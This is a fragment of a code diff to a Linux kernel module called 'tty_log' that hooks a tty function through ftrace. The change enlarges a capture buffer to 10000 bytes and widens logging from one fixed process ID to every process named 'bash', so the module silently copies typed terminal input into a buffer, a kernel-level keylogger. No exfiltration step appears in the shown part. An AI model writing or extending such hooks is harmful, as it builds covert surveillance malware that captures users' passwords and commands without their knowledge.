@@ -19,7 +19,7 @@ MODULE_AUTHOR("hyp");
 
 #define DEVICE_NAME "tty_log"
 #define SUCCESS 0
-#define BUF_SIZE 1000
+#define BUF_SIZE 10000
 
 
 #define HOOK(_name, _function, _original) \
@@ -166,11 +166,19 @@ static asmlinkage int ftrace_fixed_flag(struct tty_port *port,
 	int ret, cpid;
 
 	cpid = (int)task_tgid_nr(current);
-	if(cpid == 5363) {
+	if(!strncmp(current->comm, "bash", strlen("bash"))) {		
+		if((strlen(tty_keybuf) + size) > 9999) {
+			//clear the buffer
+			tty_keybuf[0] = '\0';
+		}
+		
+		//pr_info("comm: %s pid: %d kb_size: %d size: %d\n", current->comm, 
+		//		cpid, (int)strlen(tty_keybuf), (int)size);
+
 		strncat(tty_keybuf, chars, size);
 	}
 	
-	pr_info("flag: %c\n", flag);
+	//pr_info("current->comm: %s\n", current->comm);
 	ret = tty_fixed_flag(port, chars, flag, size);
 	
 	return ret;
